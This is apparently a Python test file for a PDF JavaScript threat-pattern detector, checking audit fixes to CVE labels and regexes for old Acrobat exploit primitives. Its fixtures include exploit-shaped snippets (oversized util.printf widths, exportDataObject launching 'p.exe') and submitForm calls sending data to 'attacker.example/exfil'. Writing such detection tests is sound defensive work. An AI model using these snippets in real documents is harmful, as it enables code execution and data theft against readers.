"""Audit follow-up — PDF JS pattern correctness fixes.

Pins the corrected behavior for items #10, #11, #12, #13, #14, #17
in AUDIT_TRIAGE.md. Each test guards a specific regression the
audit fleet flagged on the original implementation.
"""

import os
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from Utils.js_analysis import detect_threat_patterns


def _names(findings):
    return {f["pattern"] for f in findings}


# ---------------------------------------------------------------
# #10 CVE-2009-0658 → CVE-2009-1493 label correction
# ---------------------------------------------------------------


def test_customdictionaryopen_uses_correct_cve_label():
    """customDictionaryOpen is CVE-2009-1493, not CVE-2009-0658.
    The wrong label was factually entrenched in the test suite —
    this regression guard ensures it stays corrected."""
    src = "this.spell.customDictionaryOpen('/x', 'y');"
    found = _names(detect_threat_patterns(src))
    assert "pdf_cve_2009_1493" in found
    # The factually wrong label must never come back
    assert "pdf_cve_2009_0658" not in found


# ---------------------------------------------------------------
# #11/#12 util.printf — width-augmented format only
# ---------------------------------------------------------------


def test_util_printf_oversized_width_fires():
    """The exploit primitive: oversized width on %d, %D, %f, %F."""
    for src in [
        'util.printf("%4500d", n);',
        'util.printf("%5000f", n);',
        'util.printf("%999D", n);',
        'util.printf("%999F", n);',
    ]:
        f = _names(detect_threat_patterns(src))
        assert "pdf_cve_2008_2992" in f, src


def test_util_printf_benign_format_does_not_fire():
    """Audit finding (codex_detect_corr_1; HIGH false-positive):
    benign ``util.printf("%d", n)`` was firing as CRITICAL CVE.
    Regression guard for the FP fix."""
    for src in [
        'util.printf("%d", 7);',
        'util.printf("%f", 1.5);',
        'util.printf("%5d", x);',     # short width — not exploit-shaped
        'util.printf("count: %d", n);',
    ]:
        f = _names(detect_threat_patterns(src))
        assert "pdf_cve_2008_2992" not in f, f"FP on {src!r}: {f}"


def test_util_printf_covers_f_specifier():
    """Audit finding (codex_detect_corr_2): the original regex was %D
    only and missed %f exploit shapes. Regression guard for the
    coverage fix."""
    src = 'util.printf("%5000f", x);'
    assert "pdf_cve_2008_2992" in _names(detect_threat_patterns(src))


# ---------------------------------------------------------------
# #13 getAnnots — only abusive shape, not benign API usage
# ---------------------------------------------------------------


def test_getannots_critical_requires_nstart_and_nend():
    """Audit finding (codex_detect_corr_1, _2): the original CRITICAL
    regex matched mere presence of ``nStart``. The exploit primitive
    is the relationship between nStart and nEnd, so require both."""
    # Should fire — both params present
    src_exploit = "this.getAnnots({nStart: 0, nEnd: -1});"
    assert "pdf_cve_2009_1492" in _names(detect_threat_patterns(src_exploit))


def test_getannots_critical_no_fp_on_benign_nstart_only():
    """Benign code that only passes nStart (e.g. iteration helper)
    must not light up as CRITICAL."""
    src = "this.getAnnots({nStart: 0});"
    found = _names(detect_threat_patterns(src))
    assert "pdf_cve_2009_1492" not in found


def test_getannots_high_no_fp_on_no_arg_call():
    """Audit finding: the HIGH-tier ``pdf_get_annots`` regex used to
    match plain ``this.getAnnots()`` enumeration which is benign and
    common. Now requires the object-arg form ``getAnnots({...})``."""
    src = "var all = this.getAnnots();"
    found = _names(detect_threat_patterns(src))
    assert "pdf_get_annots" not in found


def test_getannots_high_fires_on_object_arg():
    src = "this.getAnnots({nPage: 0});"
    found = _names(detect_threat_patterns(src))
    assert "pdf_get_annots" in found


# ---------------------------------------------------------------
# #14 exportDataObject — require nLaunch>0
# ---------------------------------------------------------------


def test_export_data_no_fp_without_nlaunch():
    """Benign attachment export (cName only, no nLaunch / nLaunch=0)
    must not fire as HIGH. The exploit primitive is nLaunch>0."""
    for src in [
        "this.exportDataObject({cName: 'attachment.bin'});",
        "this.exportDataObject({cName: 'attachment.bin', nLaunch: 0});",
    ]:
        f = _names(detect_threat_patterns(src))
        assert "pdf_export_data" not in f, f"FP on {src!r}: {f}"


def test_export_data_fires_on_nlaunch_open_with_default():
    src = "this.exportDataObject({cName: 'p.exe', nLaunch: 2});"
    assert "pdf_export_data" in _names(detect_threat_patterns(src))


def test_export_data_fires_on_nlaunch_1():
    src = "this.exportDataObject({cName: 'p.exe', nLaunch: 1});"
    assert "pdf_export_data" in _names(detect_threat_patterns(src))


# ---------------------------------------------------------------
# Audit finding: submitForm object form was invisible
# ---------------------------------------------------------------


def test_submit_form_string_arg_fires():
    """The shape that was already covered."""
    src = "this.submitForm('https://attacker.example/exfil', true);"
    assert "pdf_submit_form_url" in _names(detect_threat_patterns(src))


def test_submit_form_object_arg_fires():
    """Audit finding (codex_detect_corr_1; HIGH): the official Adobe-
    documented object-arg form ``{cURL: "..."}`` was invisible to the
    string-only matcher."""
    src = 'this.submitForm({cURL: "https://attacker.example/exfil"});'
    assert "pdf_submit_form_url" in _names(detect_threat_patterns(src))


# ---------------------------------------------------------------
# #17 Collab.collectEmailInfo description was wrong
# ---------------------------------------------------------------


def test_collectemailinfo_description_is_buffer_overflow():
    """Audit finding (codex_detect_corr_1): the description said
    'sandbox escape' but public references describe a buffer-overflow
    primitive. Pin the corrected description."""
    src = "Collab.collectEmailInfo({});"
    findings = detect_threat_patterns(src)
    relevant = [f for f in findings if f["pattern"] == "pdf_cve_2007_5659"]
    assert relevant
    desc = relevant[0]["description"].lower()
    assert "buffer overflow" in desc
    assert "sandbox escape" not in desc
